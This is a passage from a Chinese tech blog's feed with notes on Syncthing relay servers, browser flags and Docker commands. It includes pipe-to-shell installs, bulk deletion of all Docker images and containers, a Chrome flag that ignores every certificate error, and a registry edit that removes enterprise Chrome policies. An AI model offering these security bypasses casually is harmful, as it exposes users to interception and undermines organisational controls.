ACCEPT<br></code></pre></td></tr></table></figure><blockquote><p>备注：若要关闭防火墙，把ACCEPT改为DROP</p></blockquote><ul><li><p>22067&#x2F;TCP端口：作用：用于客户端和中继服务器之间的通信。这是客户端连接到中继服务器的默认端口，使用的是 TCP 协议。必须开启的端口： 因为这是客户端连接中继服务的必要端口。</p></li><li><p>22070&#x2F;TCP端口：作用：用于中继服务器之间的状态报告和管理通信（例如统计数据收集）。使用的 TCP 协议。可选开启的端口：如果你希望中继服务器能够上报状态或被外部管理，则需要开启此端口。</p></li></ul><h1 id="配置到客户端"><a href="#配置到客户端" class="headerlink" title="配置到客户端"></a>配置到客户端</h1><h2 id="发现服务器"><a href="#发现服务器" class="headerlink" title="发现服务器"></a>发现服务器</h2><ol><li><p>进入stdiscosrv文件夹</p></li><li><p>查看日志，获取服务器id</p></li></ol><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/stdiscosrv.<span class="hljs-keyword">log</span><br></code></pre></td></tr></table></figure><p><img src="/2024/05/14/WEB/%E6%90%AD%E5%BB%BAsyncthing%E7%9A%84%E4%B8%AD%E7%BB%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%85%A8%E7%90%83%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/image-3.png" alt="alt text"></p><ol start="3"><li>配置到客户端</li></ol><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">default</span>, https:<span class="hljs-comment">//你的ip或域名:8443/?id=服务器ID</span><br></code></pre></td></tr></table></figure><h2 id="中继服务器"><a href="#中继服务器" class="headerlink" title="中继服务器"></a>中继服务器</h2><ol><li><p>进入strelaysrv文件夹</p></li><li><p>查看日志，获取uri</p></li></ol><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/strelaysrv.<span class="hljs-keyword">log</span><br></code></pre></td></tr></table></figure><p><img src="/2024/05/14/WEB/%E6%90%AD%E5%BB%BAsyncthing%E7%9A%84%E4%B8%AD%E7%BB%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%85%A8%E7%90%83%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/image-1.png" alt="alt text"></p><ol start="3"><li><p>看到<code>relay:</code>开头那一行就是uri,如上图所示，直接复制下来，把<code>0.0.0.0</code>改成自己的ip或域名</p></li><li><p>配置到客户端</p></li></ol><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">default</span>, relay:<span class="hljs-comment">//10.0.0.120:22067/?id=xxxx</span><br></code></pre></td></tr></table></figure><h2 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h2><p>打开客户端web页面，一般是<a href="localhost:8384">localhost:8384</a></p><p>位置在右上角：操作-&gt;设置-&gt;连接</p><p><img src="/2024/05/14/WEB/%E6%90%AD%E5%BB%BAsyncthing%E7%9A%84%E4%B8%AD%E7%BB%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%85%A8%E7%90%83%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/image-2.png" alt="alt text"></p><p>参数<code>default</code>表示使用公共的服务器。如果不想用公共的服务器，则可以把<code>default</code>参数去掉</p><p>最后记得配置开机自启动</p><h1 id="数据配置存储位置"><a href="#数据配置存储位置" class="headerlink" title="数据配置存储位置"></a>数据配置存储位置</h1><p>若要进行数据迁移，记得备份以下目录</p><ul><li><p>若服务以当前用户身份运行，数据通常存储在：<code>%LOCALAPPDATA%\Syncthing</code>（对应完整路径如：<code>C:\Users\[用户名]\AppData\Local\Syncthing</code>） </p></li><li><p>若服务以系统账户（如LocalService或NetworkService）运行，路径为： <code>C:\Windows\System32\config\systemprofile\AppData\Local\Syncthing</code></p></li></ul><p>若需要重置数据库文件，可以删除数据存储目录下的<code>.db</code>后缀的文件夹目录，然后重启服务。</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>浏览器实验性功能调试</title>
    <link href="/2024/05/14/%E5%85%B6%E5%AE%83/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%9E%E9%AA%8C%E6%80%A7%E5%8A%9F%E8%83%BD%E8%B0%83%E8%AF%95/"/>
    <url>/2024/05/14/%E5%85%B6%E5%AE%83/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%9E%E9%AA%8C%E6%80%A7%E5%8A%9F%E8%83%BD%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="深色模式"><a href="#深色模式" class="headerlink" title="深色模式"></a>深色模式</h1><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">chrome:</span>//flags/<span class="hljs-meta">#darken-websites-checkbox-in-themes-setting</span><br></code></pre></td></tr></table></figure><h2 id="chrome"><a href="#chrome" class="headerlink" title="chrome"></a>chrome</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">chrome:</span>//flags/<span class="hljs-meta">#enable-force-dark</span><br></code></pre></td></tr></table></figure><h3 id="改善深色主题下打开-Chrome-时会出现短暂的白屏闪烁"><a href="#改善深色主题下打开-Chrome-时会出现短暂的白屏闪烁" class="headerlink" title="改善深色主题下打开 Chrome 时会出现短暂的白屏闪烁"></a>改善深色主题下打开 Chrome 时会出现短暂的白屏闪烁</h3><p>在“快捷方式”选项卡的“目标”字段末尾添加以下参数：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--enable-features</span>=RemoveRedirectionBitmap<br></code></pre></td></tr></table></figure><h1 id="多线程下载"><a href="#多线程下载" class="headerlink" title="多线程下载"></a>多线程下载</h1><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">chrome:</span>//flags/<span class="hljs-meta">#enable-parallel-downloading</span><br></code></pre></td></tr></table></figure><h1 id="地址栏显示完整地址"><a href="#地址栏显示完整地址" class="headerlink" title="地址栏显示完整地址"></a>地址栏显示完整地址</h1><h2 id="firefox"><a href="#firefox" class="headerlink" title="firefox"></a>firefox</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">about</span>:config<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">browser<span class="hljs-selector-class">.urlbar</span>.trimURLs<br></code></pre></td></tr></table></figure><h1 id="平滑滚动"><a href="#平滑滚动" class="headerlink" title="平滑滚动"></a>平滑滚动</h1><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">chrome:</span>//flags/<span class="hljs-meta">#smooth-scrolling</span><br></code></pre></td></tr></table></figure><h1 id="解除赋予权限去除“由贵单位管理”功能选项"><a href="#解除赋予权限去除“由贵单位管理”功能选项" class="headerlink" title="解除赋予权限去除“由贵单位管理”功能选项"></a>解除赋予权限去除“由贵单位管理”功能选项</h1><p>谷歌 Chrome 浏览器地址栏输入 <code>Chrome://policy</code> ，即可看到调用企业策略的第三方软件或者是用户主动安装的第三方扩展等</p><ol><li>Windows系统按WIN+R输入“RegEdit”运行注册表管理</li><li>删除注册表<code>\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\</code>下对应的文件夹（删除整个<code>Chrome</code>目录）</li></ol><h1 id="firefox-配置备份"><a href="#firefox-配置备份" class="headerlink" title="firefox 配置备份"></a>firefox 配置备份</h1><p>设置 &gt; 帮助 &gt; 更多排障信息 &gt; 配置文件夹 &gt; 打开文件夹</p><p><a href="https://www.mozilla.org/en-US/firefox/new/?xv=refresh-new&v=b">firefox浏览器国际版下载地址</a></p><h1 id="设置Chrome忽略网站证书错误"><a href="#设置Chrome忽略网站证书错误" class="headerlink" title="设置Chrome忽略网站证书错误"></a>设置Chrome忽略网站证书错误</h1><p>某些用户可能经常会遇到Chrome浏览器提示网站证书错误的情况,尤其是在Google升级证书检查力度之后,访问Google时已经不能在浏览器界面中忽略证书错误访问.</p><p>比如说公司的IT修改过证书就会遇到这种情况。</p><p>解决这个问题很简单,只需要修改你平时用来启动Chrome的快捷方式就可以忽略掉证书错误.</p><p>具体的操作方法是这样的:</p><ol><li>找到你的Chrome快捷方式.</li><li>右键图标,选择属性</li><li>找到”目标”文本框,里面的内容是你的Chrome程序路径,类似这样<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;C:\Program Files\Google\Chrome\Application\chrome.exe&quot;</span><br></code></pre></td></tr></table></figure></li><li>在这段文本的最后面添加一个空格,然后在空格后面添加<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">--</span><span class="hljs-comment">ignore</span><span class="hljs-literal">-</span><span class="hljs-comment">certificate</span><span class="hljs-literal">-</span><span class="hljs-comment">errors</span> <span class="hljs-literal">--</span><span class="hljs-comment">test</span><span class="hljs-literal">-</span><span class="hljs-comment">type</span><br></code></pre></td></tr></table></figure></li><li>修改后的”目标”文本应该类似于这样: <figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-string">&quot;C:\Program Files\Google\Chrome\Application\chrome.exe&quot;</span> <span class="hljs-operator">--</span><span class="hljs-built_in">ignore</span><span class="hljs-operator">-</span>certificate<span class="hljs-operator">-</span>errors <span class="hljs-operator">--</span>test<span class="hljs-operator">-</span><span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure></li><li>点击确定</li><li>重新打开你的Chrome浏览器</li></ol><p>执行上述操作后,以后你每次通过该快捷方式打开Chrome,都会从根本上忽略掉浏览器中的所有证书错误.</p><h1 id="切换-ANGLE-图形后端"><a href="#切换-ANGLE-图形后端" class="headerlink" title="切换 ANGLE 图形后端"></a>切换 ANGLE 图形后端</h1><p>用于改善一些渲染异常问题</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">chrome:</span>//flags/<span class="hljs-meta">#use-angle</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>其它</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker</title>
    <link href="/2024/05/14/%E7%B3%BB%E7%BB%9F/linux/Docker/"/>
    <url>/2024/05/14/%E7%B3%BB%E7%BB%9F/linux/Docker/</url>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>ps:</p><ul><li>docker.io 是 Debian 团队维护的</li><li>docker-ce 是 docker 官方维护的社区版（Community Edition）</li><li>docker-ee 是 docker 官方维护的商业版（Enterprise Edition）</li></ul></blockquote><h3 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h3><h4 id="官方脚本"><a href="#官方脚本" class="headerlink" title="官方脚本"></a>官方脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun<br></code></pre></td></tr></table></figure><h4 id="debian-ubuntu"><a href="#debian-ubuntu" class="headerlink" title="debian&#x2F;ubuntu"></a>debian&#x2F;ubuntu</h4><p>建议直接安装apt库的docker-io版</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">apt <span class="hljs-keyword">update</span> <span class="hljs-variable">&amp;&amp;</span> apt install -y docker.io<br></code></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker version<br></code></pre></td></tr></table></figure><h3 id="docker-compose安装"><a href="#docker-compose安装" class="headerlink" title="docker-compose安装"></a>docker-compose安装</h3><p>从github上下载文件（linux通用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl -L &quot;https://github.com/docker/compose/releases/download/latest/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose &amp;&amp; chmod +x /usr/local/bin/docker-compose<br></code></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker-compose <span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><h3 id="debian-ubuntu安装docker-ce"><a href="#debian-ubuntu安装docker-ce" class="headerlink" title="debian&#x2F;ubuntu安装docker-ce"></a>debian&#x2F;ubuntu安装docker-ce</h3><ol><li>更新软件包列表：<br>在终端中执行以下命令以确保软件包列表是最新的：<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">apt update</span><br></code></pre></td></tr></table></figure></li><li>安装依赖包：<br>安装一些必要的软件包，以便使用HTTPS传输：<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">apt</span> install -y apt-trans<span class="hljs-keyword">port</span>-https ca-certificates curl gnupg2 software-properties-common dirmngr<br></code></pre></td></tr></table></figure></li><li>添加Docker官方的GPG密钥：<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -fsSL https:<span class="hljs-regexp">//</span>download.docker.com<span class="hljs-regexp">/linux/</span>debian/gpg | apt-key add -<br></code></pre></td></tr></table></figure></li><li>添加Docker软件包仓库：<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">add</span><span class="language-bash">-apt-repository <span class="hljs-string">&quot;deb [arch=amd64] https://download.docker.com/linux/debian <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span></span><br></code></pre></td></tr></table></figure></li><li>更新软件包列表：<br>再次运行更新以获取Docker软件包：<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">apt update</span><br></code></pre></td></tr></table></figure></li><li>安装Docker Engine：<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> docker-ce -y<br></code></pre></td></tr></table></figure></li><li>验证Docker版本：<br>运行以下命令来验证Docker是否正确安装：<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure></li><li>将Docker设置为开机启动：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> docker<br></code></pre></td></tr></table></figure></li><li>将用户添加到docker组（可选）：<br>如果想允许非root用户运行Docker命令，可以将他们添加到docker用户组中：<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">usermod -aG docker your_username</span><br></code></pre></td></tr></table></figure><blockquote><p>请将 “your_username” 替换为希望添加到docker组的用户名。</p></blockquote></li></ol><h3 id="RedHat-Cent安装docker-ce"><a href="#RedHat-Cent安装docker-ce" class="headerlink" title="RedHat&#x2F;Cent安装docker-ce"></a>RedHat&#x2F;Cent安装docker-ce</h3><p>卸载旧版本（如果装过）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">yum remove docker  docker-common docker-selinux docker-engine<br></code></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">yum install -y yum-utils device-mapper-persistent-data lvm2<br></code></pre></td></tr></table></figure><p>查看可用docker版本有哪些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">yum list docker-ce --showduplicates | sort -r<br></code></pre></td></tr></table></figure><p>选择一个版本并安装：<code>yum install docker-ce-版本号</code></p><blockquote><p>注意：24版本和26版本的镜像不通用</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">yum -y install docker-ce-24.0.0<br></code></pre></td></tr></table></figure><p>查看版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker version<br></code></pre></td></tr></table></figure><h2 id="改查"><a href="#改查" class="headerlink" title="改查"></a>改查</h2><h3 id="修改容器配置参数"><a href="#修改容器配置参数" class="headerlink" title="修改容器配置参数"></a>修改容器配置参数</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>containers/&lt;容器ID&gt;<br></code></pre></td></tr></table></figure><h3 id="修改docker默认存储目录"><a href="#修改docker默认存储目录" class="headerlink" title="修改docker默认存储目录"></a>修改docker默认存储目录</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>docker/daemon.json<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;data-root&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/data/docker&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl daemon-reload &amp;&amp; <span class="hljs-params">system</span>ctl restart docker<br></code></pre></td></tr></table></figure><p>一句话命令（测试）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /etc/docker &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#123;&quot;data-root&quot;:&quot;/data/docker&quot;&#125;&#x27;</span> | <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &gt;/dev/null &amp;&amp; systemctl restart docker<br></code></pre></td></tr></table></figure><h3 id="查看容器启动命令"><a href="#查看容器启动命令" class="headerlink" title="查看容器启动命令"></a>查看容器启动命令</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">docker <span class="hljs-keyword">run</span> --<span class="hljs-keyword">rm</span> -v /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/docker.sock:/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/docker.sock cucker/get_command_4_run_container &lt;容器ID&gt;<br></code></pre></td></tr></table></figure><h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><h3 id="docker-compose重新构建容器"><a href="#docker-compose重新构建容器" class="headerlink" title="docker-compose重新构建容器"></a>docker-compose重新构建容器</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker-compose up <span class="hljs-comment">--build -d</span><br></code></pre></td></tr></table></figure><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">docker pull &lt;images_name&gt;:latest    <span class="hljs-comment">//latest为最新镜像的意思</span><br></code></pre></td></tr></table></figure><h3 id="设置容器开机自启"><a href="#设置容器开机自启" class="headerlink" title="设置容器开机自启"></a>设置容器开机自启</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--restart</span>=always //容器初次启动添加的参数<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker update <span class="hljs-params">--restart=always</span> &lt;docker_ID&gt; <span class="hljs-string">//</span>已启动的容器设置<br></code></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">docker <span class="hljs-keyword">update</span> --restart=<span class="hljs-keyword">no</span> &lt;docker_ID&gt; <span class="hljs-comment">//取消开机自启动</span><br></code></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">docker ps -aq | xargs -I </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml"> docker update --restart=always </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">   //批量给所有容器添加自启动标签</span><br></code></pre></td></tr></table></figure><h3 id="将文件从本机上传到docker容器"><a href="#将文件从本机上传到docker容器" class="headerlink" title="将文件从本机上传到docker容器"></a>将文件从本机上传到docker容器</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">docker <span class="hljs-keyword">cp</span> <span class="hljs-symbol">&lt;local_path&gt;</span> <span class="hljs-symbol">&lt;docker_ID&gt;</span>:<span class="hljs-symbol">&lt;docker_path&gt;</span><br></code></pre></td></tr></table></figure><h3 id="从docker容器中下载文件"><a href="#从docker容器中下载文件" class="headerlink" title="从docker容器中下载文件"></a>从docker容器中下载文件</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">docker <span class="hljs-keyword">cp</span> <span class="hljs-symbol">&lt;docker_ID&gt;</span>:<span class="hljs-symbol">&lt;local_path&gt;</span> <span class="hljs-symbol">&lt;local_path&gt;</span><br></code></pre></td></tr></table></figure><h3 id="将容器保存为镜像"><a href="#将容器保存为镜像" class="headerlink" title="将容器保存为镜像"></a>将容器保存为镜像</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">docker commit <span class="hljs-tag">&lt;<span class="hljs-name">docker_ID</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">要保存的镜像名称</span>&gt;</span>:v1.1<br></code></pre></td></tr></table></figure><h2 id="批量操作"><a href="#批量操作" class="headerlink" title="批量操作"></a>批量操作</h2><p>给所有容器添加自启动标签</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">docker ps -aq | xargs -I </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml"> docker update --restart=always </span><span class="hljs-template-variable">&#123;&#125;</span><br></code></pre></td></tr></table></figure><p>停止&#x2F;删除所有容器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">docker stop <span class="hljs-variable">$</span>(docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-a</span> <span class="hljs-literal">-q</span>)<br>docker <span class="hljs-built_in">rm</span> <span class="hljs-variable">$</span>(docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-a</span> <span class="hljs-literal">-q</span>)<br></code></pre></td></tr></table></figure><p>停止&#x2F;删除所有名字包含<code>linglong</code>的容器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">docker stop <span class="hljs-variable">$</span>(docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-a</span> | grep <span class="hljs-string">&#x27;linglong&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>docker <span class="hljs-built_in">rm</span> <span class="hljs-variable">$</span>(docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-a</span> | grep <span class="hljs-string">&#x27;linglong&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>删除所有未打<code>dangling</code>标签的镜像</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker rmi $(docker images -q -f <span class="hljs-attribute">dangling</span>=<span class="hljs-literal">true</span>)<br></code></pre></td></tr></table></figure><p>删除所有名字包含<code>linglong</code>的镜像</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> rmi $(docker images | grep <span class="hljs-string">&quot;linglong&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$3</span>&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>删除所有镜像</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">docker rmi <span class="hljs-operator">-f</span> <span class="hljs-variable">$</span>(docker images <span class="hljs-literal">-q</span>)<br></code></pre></td></tr></table></figure><h2 id="配置docker代理"><a href="#配置docker代理" class="headerlink" title="配置docker代理"></a>配置docker代理</h2><ol><li><p>创建 dockerd 相关的 systemd 目录，这个目录下的配置将覆盖 dockerd 的默认配置</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d<br></code></pre></td></tr></table></figure></li><li><p>新建配置文件 <code>http-proxy.conf</code>，这个文件中将包含环境变量</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/systemd/system/docker.service.d/http-proxy.conf<br></code></pre></td></tr></table></figure></li><li><p>写入代理配置 </p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Service]<br>Environment=<span class="hljs-string">&quot;HTTP_PROXY=http://10.0.0.100:10808&quot;</span><br>Environment=<span class="hljs-string">&quot;HTTPS_PROXY=http://10.0.0.100:10808&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>重新加载配置文件，重启 dockerd</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl daemon-reload &amp;&amp; systemctl restart docker<br></code></pre></td></tr></table></figure></li></ol><p>一句话命令（测试）</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">mkdir -p /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/docker.service.d &amp;&amp; echo -e <span class="hljs-string">&#x27;[Service]\nEnvironment=&quot;HTTP_PROXY=http://10.0.0.100:10808&quot;\nEnvironment=&quot;HTTPS_PROXY=http://10.0.0.100:10808&quot;&#x27;</span> &gt; /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/docker.service.d/http-proxy.conf &amp;&amp; <span class="hljs-params">system</span>ctl daemon-reload &amp;&amp; <span class="hljs-params">system</span>ctl restart docker<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>系统</category>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows安装配置FileBrowser</title>
    <link href="/2024/05/13/WEB/windows%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEFileBrowser/"/>
    <url>/2024/05/13/WEB/windows%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEFileBrowser/</url>
    
